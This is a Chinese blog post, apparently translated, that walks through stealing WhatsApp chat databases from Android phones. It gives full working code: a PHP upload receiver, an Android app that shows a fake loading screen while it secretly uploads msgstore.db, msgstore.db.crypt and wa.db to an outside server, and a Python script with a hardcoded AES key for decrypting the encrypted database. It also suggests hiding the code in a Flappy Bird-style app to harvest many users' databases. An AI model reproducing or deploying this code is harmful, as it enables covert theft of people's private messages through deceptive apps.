---
author: viviworld
comments: true
date: 2014-03-13 00:06:23+00:00
layout: post
link: http://www.labazhou.net/2014/03/steal-whatsapp-database/
slug: steal-whatsapp-database
title: 偷取WhatsApp的数据库
wordpress_id: 422
categories:
- 编程
tags:
- android
- Eclipse
- facebook
- Flappy Bird
- SQLite
- WhatsApp
---

<blockquote>“从另一个Android应用程序上传并读取WhatsApp聊天记录是可能的吗？”</blockquote>


[我兄弟](https://twitter.com/thiceNL)和我就这个问题开始了一次有趣的对话，最终经过了验证。长话短说，答案是：“是的，那有可能。”

[WhatsApp](http://www.whatsapp.com/)数据库保存在SD卡，它能够被任何Android应用程序读取，只要用户允许它访问SD卡。既然大部分人允许Android设备的所有权限，这就不是多大的问题。

那么我们怎么做才能偷取某人的WhatsApp数据库呢？首先我们需要存储数据库的地方。我使用只有一个简单php脚本的[web服务器](http://bas.bosschert.nl/)。

    
    
    <?php
    // Upload script to upload Whatsapp database
    // This script is for testing purposes only.
    
    $uploaddir = "/tmp/whatsapp/";
    
    if ($_FILES["file"]["error"] > 0)
      {
      echo "Error: " . $_FILES["file"]["error"] . "<br>";
      }
    else
      {
      echo "Upload: " . $_FILES["file"]["name"] . "<br>";
      echo "Type: " . $_FILES["file"]["type"] . "<br>";
      echo "Size: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
      echo "Stored in: " . $_FILES["file"]["tmp_name"];
    
      $uploadfile = $uploaddir . $_SERVER['REMOTE_ADDR'] . "." . basename($_FILES['file']['name']);
      move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
      }
    ?>
    
    <html><head><title>Shoo.. nothing here</title></head><body><form method="post" enctype="multipart/form-data"><input type="file" name="file" id="file"><input type="submit" value="Submit"></form></body></html>


确信你配置了php.ini，便于上传（较大）文件。

    
    
    file_uploads = On
    post_max_size = 32M
    upload_max_filesize = 32M


我们需要的下一个步骤是能够上传WhatsApp数据库到这个网站的Android应用程序。我在Eclipse产生一个新的默认项目，做了一些修改。最重要的是我们需要一些访问SD卡、并上传到因特网的额外权限。因此我在AndroidManifest.xml文件添加以下行。

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <manifest xmlns:android="http://schemas.android.com/apk/res/android"
        package="bb.security.whatsappupload"
        android:versionCode="1"
        android:versionName="1.0" >
    
        <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
        <uses-permission android:name="android.permission.INTERNET" /> 
    
        <uses-sdk
            android:minSdkVersion="8"
            android:targetSdkVersion="19" />
    
        <application
            android:allowBackup="true"
            android:icon="@drawable/ic_launcher"
            android:label="@string/app_name"
            android:theme="@style/AppTheme" >
    
            <activity
                android:name="bb.security.whatsappupload.MainActivity"
                android:label="@string/app_name" >
                <intent-filter>
                    <action android:name="android.intent.action.MAIN" />
    
                    <category android:name="android.intent.category.LAUNCHER" />
                </intent-filter>
            </activity>
        </application>
    
    </manifest>


我使用Eclipse默认产生的layout，但是我把TextView挪到了中间，并增加了文本尺寸。在你看到layout之前，上传魔法会发生，这是为了验证activity_main.xml足够完美。

    
    
    <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:paddingBottom="@dimen/activity_vertical_margin"
        android:paddingLeft="@dimen/activity_horizontal_margin"
        android:paddingRight="@dimen/activity_horizontal_margin"
        android:paddingTop="@dimen/activity_vertical_margin"
        tools:context=".MainActivity" >
    
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentTop="true"
            android:layout_centerHorizontal="true"
            android:layout_marginTop="179dp"
            android:text="@string/hello_world"
            android:textSize="24sp" />
    
    </RelativeLayout>


目前还没有让人激动的事情，真正的激动在MainActivity.java文件。我们会试着上传3个文件：



	
  * /WhatsApp/Databases/msgstore.db

	
  * /WhatsApp/Databases/wa.db

	
  * /WhatsApp/Databases/msgstore.db.crypt


新版的WhatsApp打算在数据库（msgstore.db.crypt）做一些crypto魔法，因此这会更安全。从这个数据库读取聊天记录仍然是可能的，不过更加困难。msgstore.db和wa.db是WhatsApp较老的未加密数据库。

在WhatsApp数据库文件上传的时候，我们会显示一个简单的载入界面，让人们认为这个应用程序正在后台做着有意思的事情。

    
    
    package bb.security.whatsappupload;
    
    /*
     * This application is for testing purposes only. 
     * Use of this application is at your own risk.
     */
    
    import java.io.DataInputStream;
    import java.io.DataOutputStream;
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.IOException;
    import java.net.HttpURLConnection;
    import java.net.MalformedURLException;
    import java.net.URL;
    
    import android.os.AsyncTask;
    import android.os.Bundle;
    import android.os.Environment;
    import android.app.Activity;
    import android.app.ProgressDialog;
    import android.util.Log;
    import android.view.Menu;
    
    public class MainActivity extends Activity {
    
    	//A ProgressDialog object
    	private ProgressDialog progressDialog;
    
    	@Override
    	protected void onCreate(Bundle savedInstanceState) {
    		super.onCreate(savedInstanceState);
    		setContentView(R.layout.activity_main);
    		new UploadWhatsApp().execute();
    	}
    
    	@Override
    	public boolean onCreateOptionsMenu(Menu menu) {
    		// Inflate the menu; this adds items to the action bar if it is present.
    		getMenuInflater().inflate(R.menu.main, menu);
    		return true;
    	}
    
    	@SuppressWarnings("deprecation")
    	private void uploadFile(String file) {
    		HttpURLConnection conn = null;
    		DataOutputStream dos = null;
    		DataInputStream inStream = null;
    
    		Log.i("FILE", "Filename:\n" + file);
    
    		String lineEnd = "\r\n";
    		String twoHyphens = "--";
    		String boundary = "*****";
    		int bytesRead, bytesAvailable, bufferSize;
    		byte[] buffer;
    		int maxBufferSize = 1 * 1024 * 1024 * 1024;
    		String urlString = "http://bas.bosschert.nl/whatsapp/upload_wa.php";
    		try {
    			// 	------------------ CLIENT REQUEST
    			FileInputStream fileInputStream = new FileInputStream(new File(
    					file));
    			// open a URL connection to the Servlet
    			URL url = new URL(urlString);
    			// Open a HTTP connection to the URL
    			conn = (HttpURLConnection) url.openConnection();
    			// Allow Inputs
    			conn.setDoInput(true);
    			// Allow Outputs
    			conn.setDoOutput(true);
    			// Don't use a cached copy.
    			conn.setUseCaches(false);
    			// Use a post method.
    			conn.setRequestMethod("POST");
    			conn.setRequestProperty("Connection", "Keep-Alive");
    			conn.setRequestProperty("Content-Type",
    					"multipart/form-data;boundary=" + boundary);
    			dos = new DataOutputStream(conn.getOutputStream());
    			dos.writeBytes(twoHyphens + boundary + lineEnd);
    			dos.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\""
    					+ file + "\"" + lineEnd);
    			dos.writeBytes(lineEnd);
    			// create a buffer of maximum size
    			bytesAvailable = fileInputStream.available();
    			bufferSize = Math.min(bytesAvailable, maxBufferSize);
    			buffer = new byte[bufferSize];
    			// read file and write it into form...
    			bytesRead = fileInputStream.read(buffer, 0, bufferSize);
    			while (bytesRead > 0) {
    				dos.write(buffer, 0, bufferSize);
    				bytesAvailable = fileInputStream.available();
    				bufferSize = Math.min(bytesAvailable, maxBufferSize);
    				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
    			}
    			// send multipart form data necesssary after file data...
    			dos.writeBytes(lineEnd);
    			dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
    			// close streams
    			Log.e("Debug", "File is written");
    			fileInputStream.close();
    			dos.flush();
    			dos.close();
    		} catch (MalformedURLException ex) {
    			Log.e("Debug", "error: " + ex.getMessage(), ex);
    		} catch (IOException ioe) {
    			Log.e("Debug", "error: " + ioe.getMessage(), ioe);
    		}
    		// ------------------ read the SERVER RESPONSE
    		try {
    			if (conn != null){
    				inStream = new DataInputStream(conn.getInputStream());
    				String str;
    
    				while ((str = inStream.readLine()) != null) {
    					Log.e("Debug", "Server Response " + str);
    				}
    				inStream.close();
    			}
    
    		} catch (IOException ioex) {
    			Log.e("Debug", "error: " + ioex.getMessage(), ioex);
    		}
    	}
    
    	private class UploadWhatsApp extends AsyncTask<Void, Integer, Void>{
    
    		@Override
    		protected void onPreExecute()
    		{
    			//Create a new progress dialog
    			progressDialog = ProgressDialog.show(MainActivity.this,"Loading Application, please wait...",
    				    "Loading, please wait...", false, false);
    		}
    
    		//The code to be executed in a background thread.
    		@Override
    		protected Void doInBackground(Void... params)
    		{
    
    			String fileWACrypt = Environment.getExternalStorageDirectory()
    					.getPath() + "/WhatsApp/Databases/msgstore.db.crypt";
    			String fileWAPlain = Environment.getExternalStorageDirectory()
    					.getPath() + "/WhatsApp/Databases/msgstore.db";
    			String fileWAwa = Environment.getExternalStorageDirectory()
    					.getPath() + "/WhatsApp/Databases/wa.db";
    
    			MainActivity.this.uploadFile(fileWACrypt);
    			MainActivity.this.uploadFile(fileWAPlain);
    			MainActivity.this.uploadFile(fileWAwa);
    			return null;
    		}
    
    		//Update the progress
    		@Override
    		protected void onProgressUpdate(Integer... values)
    		{
    			//set the current progress of the progress dialog
    			progressDialog.setProgress(values[0]);
    		}
    
    		//after executing the code in the thread
    		@Override
    		protected void onPostExecute(Void result)
    		{
    			//close the progress dialog
    			progressDialog.dismiss();
    			//initialize the View
    			setContentView(R.layout.activity_main);
    		}
    
    	}
    }


在载入界面做魔法，你也可以把这块代码增加到一个真正的应用程序，而不是你看到的Hello World文字。把它和[FlappyBird](http://en.wikipedia.org/wiki/Flappy_Bird)之类的东东以及如何从未知源安装应用程序的说明文字联合在一起，你能够收获大量的数据库。

WhatsApp数据库是SQLite3数据库，它能够被[转换成](http://smallbusiness.chron.com/convert-sqlite-excel-40798.html)更容易访问的Excel格式。随后WhatsApp将用encryption加密数据库，因此它就不能被[SQLite](http://www.sqlite.org/)打开了。但是我们借助一个简单的python脚本就能轻松解密该数据库。这个脚本把加密后的数据库转换成完全的SQLite3数据库（从[WhatsApp Xtract](http://forum.xda-developers.com/showthread.php?t=1583021)获取key）。

    
    
    #!/usr/bin/env python
    
    import sys
    from Crypto.Cipher import AES
    
    try:
        wafile=sys.argv[1]
    except:
        print "Usage: %s <msgstore.db.crypt>" % __file__
        sys.exit(1)
    
    key = "346a23652a46392b4d73257c67317e352e3372482177652c".decode('hex')
    cipher = AES.new(key,1)
    open('msgstore.db',"wb").write(cipher.decrypt(open(wafile,"rb").read()))


最终，我们能够得出结论：每个应用程序都能够读取WhatsApp数据库，还可能从加密后的数据库读取聊天记录。Facebook不需要为了读取人们的聊天记录而收购WhatsApp。

原文地址：[http://bas.bosschert.nl/steal-whatsapp-database/](http://bas.bosschert.nl/steal-whatsapp-database/)
